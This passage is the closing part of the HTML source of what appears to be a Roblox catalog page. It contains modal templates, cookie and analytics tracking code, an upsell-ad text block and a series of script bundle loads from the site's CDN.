                    Cancel: "Cancel",
                };
                //</sl:translate>
            </script>
        </div>

        <div id="modal-confirmation" class="modal-confirmation" data-modal-type="confirmation">
            <div id="modal-dialog" class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header">
                        <button type="button" class="close" data-dismiss="modal">
                            <span aria-hidden="true"><span class="icon-close"></span></span><span class="sr-only">Close</span>
                        </button>
                        <h5 class="modal-title"></h5>
                    </div>

                    <div class="modal-body">
                        <div class="modal-top-body">
                            <div class="modal-message"></div>
                            <div class="modal-image-container roblox-item-image" data-image-size="medium" data-no-overlays="" data-no-click="">
                                <img class="modal-thumb" alt="generic image" />
                            </div>
                            <div class="modal-checkbox checkbox">
                                <input id="modal-checkbox-input" type="checkbox" />
                                <label for="modal-checkbox-input"></label>
                            </div>
                        </div>
                        <div class="modal-btns">
                            <a href="" id="confirm-btn"><span></span></a>
                            <a href="" id="decline-btn"><span></span></a>
                        </div>
                        <div class="loading modal-processing">
                            <img class="loading-default" src="https://images.rbxcdn.com/4bed93c91f909002b1f17f05c0ce13d1.gif" alt="Processing..." />
                        </div>
                    </div>
                    <div class="modal-footer text-footer"></div>
                </div>
            </div>
        </div>

        <script type="text/javascript">
            var Roblox = Roblox || {};
            Roblox.jsConsoleEnabled = false;
        </script>

        <script type="text/javascript">
            $(function () {
                Roblox.CookieUpgrader.domain = "roblox.com";
                Roblox.CookieUpgrader.upgrade("GuestData", { expires: Roblox.CookieUpgrader.thirtyYearsFromNow });
                Roblox.CookieUpgrader.upgrade("RBXSource", {
                    expires: function (cookie) {
                        return Roblox.CookieUpgrader.getExpirationFromCookieValue("rbx_acquisition_time", cookie);
                    },
                });
                Roblox.CookieUpgrader.upgrade("RBXViralAcquisition", {
                    expires: function (cookie) {
                        return Roblox.CookieUpgrader.getExpirationFromCookieValue("time", cookie);
                    },
                });

                Roblox.CookieUpgrader.upgrade("RBXMarketing", { expires: Roblox.CookieUpgrader.thirtyYearsFromNow });

                Roblox.CookieUpgrader.upgrade("RBXSessionTracker", { expires: Roblox.CookieUpgrader.fourHoursFromNow });

                Roblox.CookieUpgrader.upgrade("RBXEventTrackerV2", { expires: Roblox.CookieUpgrader.thirtyYearsFromNow });
            });
        </script>

        <script
            onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)"
            data-monitor="true"
            data-bundlename="intl-polyfill"
            type="text/javascript"
            src="https://js.rbxcdn.com/d44520f7da5ec476cfb1704d91bab327.js"
        ></script>

        <script
            onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)"
            data-monitor="true"
            data-bundlename="InternationalCore"
            type="text/javascript"
            src="https://js.rbxcdn.com/ff3308aa2e909de0f9fcd5da7b529db247f69fe9b4072cbbc267749800a4d9e6.js"
        ></script>

        <script
            onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)"
            data-monitor="true"
            data-bundlename="TranslationResources"
            type="text/javascript"
            src="https://js.rbxcdn.com/83d836a661ff433d5b7ce719c489e43af590ff75ab39ccc6d393546fe91b766a.js"
        ></script>

        <script
            onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)"
            data-monitor="true"
            data-bundlename="leanbase"
            type="text/javascript"
            src="https://js.rbxcdn.com/63c7df988cef893b4f0e4bc471c56fff.js"
        ></script>

        <script
            onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)"
            data-monitor="true"
            data-bundlename="CoreUtilities"
            type="text/javascript"
            src="https://js.rbxcdn.com/91659a002be82bcb8a73e25d126d3f2bcd4ae95d38b096afbae30894d7b087fd.js"
        ></script>

        <script
            onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)"
            data-monitor="true"
            data-bundlename="CoreRobloxUtilities"
            type="text/javascript"
            src="https://js.rbxcdn.com/1a4c5425659ff46d4fa255e4ed3e06de75cdc801bd22c3f25426414e95b39d65.js"
        ></script>

        <script
            onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)"
            data-monitor="true"
            data-bundlename="React"
            type="text/javascript"
            src="https://js.rbxcdn.com/6beb1c5bcec1a4449303da9e523d45a1aa1652f9b42ae6c8a3ac347955ca3b3f.js"
        ></script>

        <script
            onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)"
            data-monitor="true"
            data-bundlename="ReactUtilities"
            type="text/javascript"
            src="https://js.rbxcdn.com/898cb6e9c467d15ad80a67d019f3815d35dbc6ff60c12ef7dd928e8fbaf02b0b.js"
        ></script>

        <script
            onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)"
            data-monitor="true"
            data-bundlename="ReactStyleGuide"
            type="text/javascript"
            src="https://js.rbxcdn.com/253dbc984ab23858a24067ed2cab303c4e8f3dbbaf8c37914bfd19d12dd0b161.js"
        ></script>

        <script
            onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)"
            data-monitor="true"
            data-bundlename="angular"
            type="text/javascript"
            src="https://js.rbxcdn.com/ae3d621886e736e52c97008e085fa286.js"
        ></script>

        <script
            onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)"
            data-monitor="true"
            data-bundlename="AngularJsUtilities"
            type="text/javascript"
            src="https://js.rbxcdn.com/847917a7f1bbf64acfe083d81e073fc520f9d942383854f4db42a2a7f9701444.js"
        ></script>

        <script
            onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)"
            data-monitor="true"
            data-bundlename="InternationalAngularJs"
            type="text/javascript"
            src="https://js.rbxcdn.com/95f7afb5fcb3c8ae379d51661e32c54ea8d8b823ace7574bd0b7fab9275cba6b.js"
        ></script>

        <script
            onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)"
            data-monitor="true"
            data-bundlename="Thumbnails"
            type="text/javascript"
            src="https://js.rbxcdn.com/ed49a01b602c4b87904bd61317bf8be809837473372bfafc163f566a30430a31.js"
        ></script>

        <div ng-modules="baseTemplateApp" class="ng-scope">
            <script type="text/javascript" src="https://js.rbxcdn.com/ffcc04436179c6b2a6668fdfcfbf62b1.js"></script>
        </div>

        <div ng-modules="pageTemplateApp" class="ng-scope">
            <!-- Template bundle: page -->
            <script type="text/javascript">
                "use strict";
                angular.module("pageTemplateApp", []).run(["$templateCache", function ($templateCache) {}]);
            </script>
        </div>

        <script type="text/javascript">
            Roblox.config.externalResources = [];
            Roblox.config.paths["Pages.Catalog"] = "https://js.rbxcdn.com/0d2759e7f03a464f0b8c0909a28405c5.js";
            Roblox.config.paths["Pages.CatalogShared"] = "https://js.rbxcdn.com/1b451357891fcc5351b20d20504aa8ad.js";
            Roblox.config.paths["Widgets.AvatarImage"] = "https://js.rbxcdn.com/7d49ac94271bd506077acc9d0130eebb.js";
            Roblox.config.paths["Widgets.DropdownMenu"] = "https://js.rbxcdn.com/da553e6b77b3d79bec37441b5fb317e7.js";
            Roblox.config.paths["Widgets.GroupImage"] = "https://js.rbxcdn.com/8ad41e45c4ac81f7d8c44ec542a2da0a.js";
            Roblox.config.paths["Widgets.HierarchicalDropdown"] = "https://js.rbxcdn.com/4a0af9989732810851e9e12809aeb8ad.js";
            Roblox.config.paths["Widgets.ItemImage"] = "https://js.rbxcdn.com/61a0490ba23afa17f9ecca2a079a6a57.js";
            Roblox.config.paths["Widgets.PlaceImage"] = "https://js.rbxcdn.com/a6df74a754523e097cab747621643c98.js";
        </script>

        <script>
            Roblox.XsrfToken.setToken("90rMVWUOx03p");
        </script>

        <script>
            $(function () {
                Roblox.DeveloperConsoleWarning.showWarning();
            });
        </script>

        <script type="text/javascript">
            $(function () {
                function trackReturns() {
                    function dayDiff(d1, d2) {
                        return Math.floor((d1 - d2) / 86400000);
                    }
                    if (!localStorage) {
                        return false;
                    }

                    var cookieName = "RBXReturn";
                    var cookieOptions = { expires: 9001 };
                    var cookieStr = localStorage.getItem(cookieName) || "";
                    var cookie = {};

                    try {
                        cookie = JSON.parse(cookieStr);
                    } catch (ex) {
                        // busted cookie string from old previous version of the code
                    }

                    try {
                        if (typeof cookie.ts === "undefined" || isNaN(new Date(cookie.ts))) {
                            localStorage.setItem(cookieName, JSON.stringify({ ts: new Date().toDateString() }));
                            return false;
                        }
                    } catch (ex) {
                        return false;
                    }

                    var daysSinceFirstVisit = dayDiff(new Date(), new Date(cookie.ts));
                    if (daysSinceFirstVisit == 1 && typeof cookie.odr === "undefined") {
                        RobloxEventManager.triggerEvent("rbx_evt_odr", {});
                        cookie.odr = 1;
                    }
                    if (daysSinceFirstVisit >= 1 && daysSinceFirstVisit <= 7 && typeof cookie.sdr === "undefined") {
                        RobloxEventManager.triggerEvent("rbx_evt_sdr", {});
                        cookie.sdr = 1;
                    }
                    try {
                        localStorage.setItem(cookieName, JSON.stringify(cookie));
                    } catch (ex) {
                        return false;
                    }
                }

                GoogleListener.init();

                RobloxEventManager.initialize(true);
                RobloxEventManager.triggerEvent("rbx_evt_pageview");
                trackReturns();

                RobloxEventManager._idleInterval = 450000;
                RobloxEventManager.registerCookieStoreEvent("rbx_evt_initial_install_start");
                RobloxEventManager.registerCookieStoreEvent("rbx_evt_ftp");
                RobloxEventManager.registerCookieStoreEvent("rbx_evt_initial_install_success");
                RobloxEventManager.registerCookieStoreEvent("rbx_evt_fmp");
                RobloxEventManager.startMonitor();
            });
        </script>

        <script type="text/javascript">
            var Roblox = Roblox || {};
            Roblox.UpsellAdModal = Roblox.UpsellAdModal || {};

            Roblox.UpsellAdModal.Resources = {
                //<sl:translate>
                title: "Remove Ads Like This",
                body: "Builders Club members do not see external ads like these.",
                accept: "Upgrade Now",
                decline: "No, thanks",
                //</sl:translate>
            };
        </script>

        <script
            onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)"
            data-monitor="true"
            data-bundlename="page"
            type="text/javascript"
            src="https://js.rbxcdn.com/be565770a50c380ed248bc36651ee555.js"
        ></script>

        <script
            onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)"
            data-monitor="true"
            data-bundlename="StyleGuide"
            type="text/javascript"
            src="https://js.rbxcdn.com/8bb22a3ed20988464e1c1fae9c271c1892f117c4d9dfac63eeafc5e7877d4143.js"
        ></script>

        <script
            onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)"
            data-monitor="true"
            data-bundlename="Captcha"
            type="text/javascript"
            src="https://js.rbxcdn.com/f3975ca1156aeb76add4934067ac7248ee24ccf8182211727e249dbc17c008e8.js"
        ></script>

        <script
            onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)"
            data-monitor="true"
            data-bundlename="DynamicLocalizationResourceScript_Authentication.TwoStepVerification"
            type="text/javascript"
            src="https://js.rbxcdn.com/193fc486e4534c49c5c414b40b15d8e9a7c9eb62b4b418a62ec50f9ea3dbf939.js"
        ></script>

        <script
            onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)"
            data-monitor="true"
            data-bundlename="DynamicLocalizationResourceScript_Authentication.TwoStepVerification"
            type="text/javascript"
            src="https://js.rbxcdn.com/8860ae9f44c00c872d1bd4f5469426328969da3249266892a20be963049fe628.js"
        ></script>

        <script
            onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)"
            data-monitor="true"
            data-bundlename="GameLaunch"
            type="text/javascript"
            src="https://js.rbxcdn.com/b61681d2e9cc1d3af7b03675f3656ba5bb4fa83c57fe3205b6c001e767dc9af4.js"
        ></script>

        <script
            onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)"
            data-monitor="true"
            data-bundlename="DynamicLocalizationResourceScript_Feature.GameLaunchGuestMode"
            type="text/javascript"
            src="https://js.rbxcdn.com/b6f7e0e090bb44e092c19eb7e714473be92bd8b26eb53b693e03179658950b69.js"
        ></script>

        <script
            onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)"
            data-monitor="true"
            data-bundlename="DynamicLocalizationResourceScript_Feature.GameLaunchGuestMode"
            type="text/javascript"
            src="https://js.rbxcdn.com/75d691f0d9840862e1341c56663ab6a620bed97a721809dce6ef85c68b3b0c5b.js"
        ></script>

        <script
            onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)"
            data-monitor="true"
            data-bundlename="DynamicLocalizationResourceScript_Common.VisitGame"
            type="text/javascript"
            src="https://js.rbxcdn.com/8970b46e46bddd4380edbc66639b5b333720b2633a9105d4cde2c31ba2878d97.js"
        ></script>

        <script
            onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)"
            data-monitor="true"
            data-bundlename="DynamicLocalizationResourceScript_Common.VisitGame"
            type="text/javascript"
            src="https://js.rbxcdn.com/0ea369a7496bf1e32d7a3834a06b42b1eeea4720c6a4b5fd719792d082eba641.js"
        ></script>

        <script
            onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)"
            data-monitor="true"
            data-bundlename="pageEnd"
            type="text/javascript"
            src="https://js.rbxcdn.com/b011d793c1af24dcf62b81645c6dcd11.js"
        ></script>
    </body>
</html>
